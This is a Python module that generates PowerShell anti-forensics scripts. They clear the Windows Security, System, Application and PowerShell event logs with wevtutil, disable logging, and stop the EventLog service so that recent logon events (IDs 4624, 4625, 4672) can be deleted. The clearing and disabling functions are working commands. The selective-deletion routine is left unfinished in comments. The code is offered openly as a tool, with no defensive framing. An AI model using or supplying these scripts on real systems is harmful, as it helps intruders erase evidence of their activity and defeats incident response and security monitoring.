"""
PowerShell Log Cleaner Script Generator
Generates PowerShell scripts for cleaning Windows Event Logs
"""


class PowerShellLogCleaner:
    """
    Generate PowerShell scripts for cleaning Windows logs
    
    Provides methods to generate scripts for:
    - Clearing entire logs
    - Selective event deletion
    - Enabling/disabling logs
    """
    
    @staticmethod
    def get_clear_log_script():
        """
        Generate PowerShell script to clear logs
        
        Returns:
            str: Complete PowerShell script for log cleaning
        """
        script = '''
# Windows Event Log Cleaner
# Selectively remove events

function Remove-EventLogEntry {
    param(
        [string]$LogName,
        [int[]]$EventIDs,
        [datetime]$StartTime,
        [datetime]$EndTime
    )
    
    Write-Host "[*] Cleaning $LogName logs"
    Write-Host "[*] Event IDs: $($EventIDs -join ', ')"
    Write-Host "[*] Time range: $StartTime to $EndTime"
    
    # Get events matching criteria
    $events = Get-WinEvent -LogName $LogName -ErrorAction SilentlyContinue | Where-Object {
        $EventIDs -contains $_.Id -and
        $_.TimeCreated -ge $StartTime -and
        $_.TimeCreated -le $EndTime
    }
    
    Write-Host "[+] Found $($events.Count) matching events"
    
    # Note: Direct deletion from live logs requires registry manipulation
    # This approach exports, modifies, and re-imports
    
    # Export log
    $exportPath = "$env:TEMP\\$LogName-backup.evtx"
    wevtutil epl $LogName $exportPath
    
    Write-Host "[+] Log exported to $exportPath"
    
    # For actual deletion, would need to:
    # 1. Stop event log service
    # 2. Manipulate .evtx file directly
    # 3. Restart service
    
    # Alternative: Clear specific events via registry
    # This is more complex and risky
    
    return $events.Count
}

function Clear-SecurityLog {
    # Clear Security log (generates Event 1102)
    wevtutil cl Security
    Write-Host "[+] Security log cleared"
}

function Clear-SystemLog {
    wevtutil cl System
    Write-Host "[+] System log cleared"
}

function Clear-ApplicationLog {
    wevtutil cl Application
    Write-Host "[+] Application log cleared"
}

function Clear-PowerShellLogs {
    # Clear PowerShell operational logs
    wevtutil cl "Microsoft-Windows-PowerShell/Operational"
    wevtutil cl "Windows PowerShell"
    
    Write-Host "[+] PowerShell logs cleared"
}

function Disable-EventLog {
    param([string]$LogName)
    
    # Disable specific log
    wevtutil sl $LogName /e:false
    
    Write-Host "[+] Disabled $LogName"
}

function Enable-EventLog {
    param([string]$LogName)
    
    # Re-enable log
    wevtutil sl $LogName /e:true
    
    Write-Host "[+] Enabled $LogName"
}

# Example usage
# Remove-EventLogEntry -LogName "Security" -EventIDs @(4624, 4625) -StartTime (Get-Date).AddHours(-1) -EndTime (Get-Date)

# Clear all common logs (generates 1102 events)
# Clear-SecurityLog
# Clear-SystemLog
# Clear-ApplicationLog
# Clear-PowerShellLogs

Write-Host "[*] Log cleaning script loaded"
Write-Host "[*] Available functions:"
Write-Host "    Remove-EventLogEntry"
Write-Host "    Clear-SecurityLog"
Write-Host "    Clear-SystemLog"
Write-Host "    Clear-ApplicationLog"
Write-Host "    Clear-PowerShellLogs"
Write-Host "    Disable-EventLog"
Write-Host "    Enable-EventLog"
'''
        return script
    
    @staticmethod
    def get_selective_delete_script():
        """
        Get script for selective event deletion
        
        Returns:
            str: PowerShell script for selective deletion
        """
        script = '''
# Selective Event Deletion
# Delete specific events without clearing entire log

function Delete-SpecificEvents {
    param(
        [string]$LogName = "Security",
        [int[]]$EventIDs = @(4624, 4625, 4672),
        [int]$LastNMinutes = 60
    )
    
    Write-Host "[*] Target: $LogName"
    Write-Host "[*] Event IDs: $($EventIDs -join ', ')"
    Write-Host "[*] Time window: Last $LastNMinutes minutes"
    
    # Calculate time range
    $endTime = Get-Date
    $startTime = $endTime.AddMinutes(-$LastNMinutes)
    
    # Get log file path
    $logPath = (Get-ItemProperty "HKLM:\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\$LogName").File
    
    if (-not $logPath) {
        Write-Host "[-] Could not find log file path"
        return
    }
    
    Write-Host "[*] Log file: $logPath"
    
    # Stop Event Log service
    Write-Host "[*] Stopping Event Log service..."
    Stop-Service -Name "EventLog" -Force
    
    Start-Sleep -Seconds 2
    
    # Backup original log
    $backupPath = "$logPath.backup"
    Copy-Item -Path $logPath -Destination $backupPath -Force
    
    Write-Host "[+] Backup created: $backupPath"
    
    # Manipulate log file
    # (Actual manipulation would require EVTX parsing library)
    # For demonstration, we'll use export/filter/import approach
    
    # Export events we want to keep
    $keepPath = "$env:TEMP\\keep-events.evtx"
    
    # This is where you'd filter out unwanted events
    # Requires proper EVTX manipulation
    
    # Restart Event Log service
    Write-Host "[*] Restarting Event Log service..."
    Start-Service -Name "EventLog"
    
    Write-Host "[+] Operation complete"
    Write-Host "[!] Backup at: $backupPath"
}

# Example: Delete logon events from last hour
# Delete-SpecificEvents -LogName "Security" -EventIDs @(4624, 4625) -LastNMinutes 60

Write-Host "[*] Selective deletion script loaded"
'''
        return script
    
    @staticmethod
    def save_script(script_content, output_path):
        """
        Save PowerShell script to file
        
        Args:
            script_content (str): PowerShell script content
            output_path (str): Path where script should be saved
            
        Returns:
            bool: True if successful, False otherwise
        """
        try:
            with open(output_path, 'w', encoding='utf-8') as f:
                f.write(script_content)
            print(f"[+] PowerShell script saved: {output_path}")
            return True
        except Exception as e:
            print(f"[-] Failed to save script: {e}")
            return False